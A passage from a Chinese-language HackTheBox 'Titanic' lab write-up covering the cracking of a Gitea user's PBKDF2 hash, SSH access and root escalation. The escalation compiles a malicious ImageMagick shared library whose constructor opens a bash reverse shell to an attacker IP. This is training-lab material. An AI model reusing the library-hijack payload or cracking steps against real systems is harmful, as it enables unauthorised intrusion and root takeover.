class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|97c712aa60976209ae6d1c741b1338d3|john@mail.com|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||gitea-auto|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再看表结构\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esqlite\u003e pragma table_info(user);\n\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e|INTEGER|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|lower_name|TEXT|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e|name|TEXT|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e|full_name|TEXT|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e|email|TEXT|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e|keep_email_private|INTEGER|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e|email_notifications_preference|TEXT|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-string\"\u003e'enabled'\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e|passwd|TEXT|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e|passwd_hash_algo|TEXT|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-string\"\u003e'argon2'\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e|must_change_password|INTEGER|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e|login_type|INTEGER|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e|login_source|INTEGER|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e|login_name|TEXT|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e|\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e|INTEGER|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e|location|TEXT|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e|website|TEXT|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e|rands|TEXT|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e|salt|TEXT|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们知道靶机上存在\u003ccode\u003edeveloper\u003c/code\u003e用户，所以我们将其密码拉取下来\u003c/p\u003e\n\u003cp\u003e经查询\u003ccode\u003egitea\u003c/code\u003e是使用\u003ccode\u003ePBKDF2\u003c/code\u003e 算法进行哈希 \u003ca href=\"https://github.com/dvdknaap/gitea-crack-passwords\"\u003ehttps://github.com/dvdknaap/gitea-crack-passwords\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e50000\u003c/code\u003e是迭代次数， \u003ccode\u003e8bf3e3452b78544f8bee9400d6936d34\u003c/code\u003e是盐值，执行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython ../../Tools/gitTeaPassCrack.py -s 8bf3e3452b78544f8bee9400d6936d34 -t e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 -w /usr/share/wordlists/rockyou.txt\nFound password: \u003cspan class=\"hljs-number\"\u003e25282528\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e登录\u003ccode\u003eSSH\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/titanic  ssh developer@\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e           \nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'10.10.11.55 (10.10.11.55)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\ndeveloper@10.10.11.55'\u003c/span\u003es password: \nWelcome to Ubuntu \u003cspan class=\"hljs-number\"\u003e22.04\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e LTS (GNU/Linux \u003cspan class=\"hljs-number\"\u003e5.15\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e131\u003c/span\u003e-generic x86_64)\n\n * Documentation:  https://\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e of Thu Feb \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e PM UTC \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e\n\n  System load:           \u003cspan class=\"hljs-number\"\u003e0.03\u003c/span\u003e\n  Usage of /:            \u003cspan class=\"hljs-number\"\u003e67.6\u003c/span\u003e% of \u003cspan class=\"hljs-number\"\u003e6.79\u003c/span\u003eGB\n  Memory usage:          \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e%\n  Swap usage:            \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e%\n  Processes:             \u003cspan class=\"hljs-number\"\u003e257\u003c/span\u003e\n  Users logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e:       \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n  IPv4 address \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e eth0: \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e\n  IPv6 address \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e eth0: dead:beef::\u003cspan class=\"hljs-number\"\u003e250\u003c/span\u003e:56ff:feb9:dc12\n\nExpanded Security Maintenance \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Applications \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e enabled.\n\n\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e run: sudo pro status\n\nThe \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of available updates \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e more than a week old.\nTo check \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e proxy settings\n\ndeveloper@titanic:~$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/opt/scripts\u003c/code\u003e 下发现\u003ccode\u003eidentify_images.sh\u003c/code\u003e (看了\u003ccode\u003eWP\u003c/code\u003e)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edeveloper@titanic:/opt/scripts$ ls\nidentify_images.sh\n\ndeveloper@titanic:/opt/scripts$ ls -al\ntotal \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Feb  \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e .\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Feb  \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e ..\n-rwxr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e167\u003c/span\u003e Feb  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e identify_images.sh\n\ndeveloper@titanic:/opt/scripts$ cat identify_images.sh \ncd /opt/app/static/assets/images\ntruncate -s \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e metadata.log\nfind /opt/app/static/assets/images/ -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f -name \u003cspan class=\"hljs-string\"\u003e\"*.jpg\"\u003c/span\u003e | xargs /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/magick identify \u003e\u003e metadata.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e遍历 \u003ccode\u003e/opt/app/static/assets/images/\u003c/code\u003e 目录下所有的 \u003ccode\u003e.jpg\u003c/code\u003e 文件，使用 \u003ccode\u003eImageMagick\u003c/code\u003e 的 \u003ccode\u003eidentify\u003c/code\u003e 命令提取它们的元数据，并将结果记录到 \u003ccode\u003emetadata.log\u003c/code\u003e 文件中\u003c/p\u003e\n\u003cp\u003e查看\u003ccode\u003eMagick\u003c/code\u003e版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edeveloper@titanic:/opt/scripts$ magick -version\nVersion: ImageMagick \u003cspan class=\"hljs-number\"\u003e7.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e Q16-HDRI x86_64 1bfce2a62:\u003cspan class=\"hljs-number\"\u003e20240713\u003c/span\u003e https://imagemagick.org\nCopyright: (C) \u003cspan class=\"hljs-number\"\u003e1999\u003c/span\u003e ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(\u003cspan class=\"hljs-number\"\u003e4.5\u003c/span\u003e) \nDelegates (built-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib\nCompiler: gcc (\u003cspan class=\"hljs-number\"\u003e9.4\u003c/span\u003e)\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e意外的有漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/titanic  searchsploit ImageMagick     \n---------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                    |  Path\n---------------------------------------------------------------------------------- ---------------------------------\nGeekLog \u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003ex - \u003cspan class=\"hljs-string\"\u003e'ImageImageMagick.php'\u003c/span\u003e Remote File Inclusion                        | php/webapps/\u003cspan class=\"hljs-number\"\u003e3946.\u003c/span\u003etxt\nImageMagick - Memory Leak                                                         | multiple/local/\u003cspan class=\"hljs-number\"\u003e45890.\u003c/span\u003esh\nImageMagick \u003cspan class=\"hljs-number\"\u003e6.8\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e - Local Buffer Overflow (SEH)                                 | windows/local/\u003cspan class=\"hljs-number\"\u003e31688.\u003c/span\u003epl\nImageMagick \u003cspan class=\"hljs-number\"\u003e6.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e7.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e - \u003cspan class=\"hljs-string\"\u003e'ImageTragick'\u003c/span\u003e Delegate Arbitrary Command Executi | multiple/local/\u003cspan class=\"hljs-number\"\u003e39791.\u003c/span\u003erb\nImageMagick \u003cspan class=\"hljs-number\"\u003e6.\u003c/span\u003ex - \u003cspan class=\"hljs-string\"\u003e'.PNM'\u003c/span\u003e Image Decoding Remote Buffer Overflow                    | linux/dos/\u003cspan class=\"hljs-number\"\u003e25527.\u003c/span\u003etxt\nImageMagick \u003cspan class=\"hljs-number\"\u003e6.\u003c/span\u003ex - \u003cspan class=\"hljs-string\"\u003e'.SGI'\u003c/span\u003e Image File Remote Heap Buffer Overflow                   | linux/dos/\u003cspan class=\"hljs-number\"\u003e28383.\u003c/span\u003etxt\nImageMagick \u003cspan class=\"hljs-number\"\u003e7.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e6.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e - \u003cspan class=\"hljs-string\"\u003e'ImageTragick '\u003c/span\u003e Multiple Vulnerabilities          | multiple/dos/\u003cspan class=\"hljs-number\"\u003e39767.\u003c/span\u003etxt\nImageMagick \u003cspan class=\"hljs-number\"\u003e7.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e - Arbitrary File Read                                        | multiple/local/\u003cspan class=\"hljs-number\"\u003e51261.\u003c/span\u003etxt\nImageMagick \u003cspan class=\"hljs-number\"\u003e7.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e - DoS                                                        | php/dos/\u003cspan class=\"hljs-number\"\u003e51256.\u003c/span\u003etxt\nWordpress Plugin ImageMagick-Engine \u003cspan class=\"hljs-number\"\u003e1.7\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e - Remote Code Execution (RCE) (Authenti | php/webapps/\u003cspan class=\"hljs-number\"\u003e51025.\u003c/span\u003etxt\n---------------------------------------------------------------------------------- ---------------------------------\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e搜索\u003ccode\u003ePOC\u003c/code\u003e：\u003ca href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8\"\u003ehttps://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ePOC\u003c/code\u003e验证版本与靶机版本一模一样\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们知道脚本工作路径是在\u003ccode\u003e/opt/app/static/assets/images/\u003c/code\u003e 我们在其目录创建一个运行库文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egcc -x c -shared -fPIC -o ./libxcb.so\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e - \u0026#x3C;\u0026#x3C; EOF\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdio.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdlib.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;unistd.h\u003e\u003c/span\u003e\n\n__attribute__((constructor)) void init(){\n    system(\u003cspan class=\"hljs-string\"\u003e\"bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/10.10.16.42/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e);\n    exit(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n}\nEOF\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等待脚本执行（包会执行的），拿到root权限以及\u003ccode\u003eRootFlag\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e","title":"HackTheBox - Season7-Titanic","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","Linux靶机","encrypt"],"categories":"靶机","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason7-Titanic"},"buildId":"Ccn3Uy_j8m9kBQAk6sKIJ","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>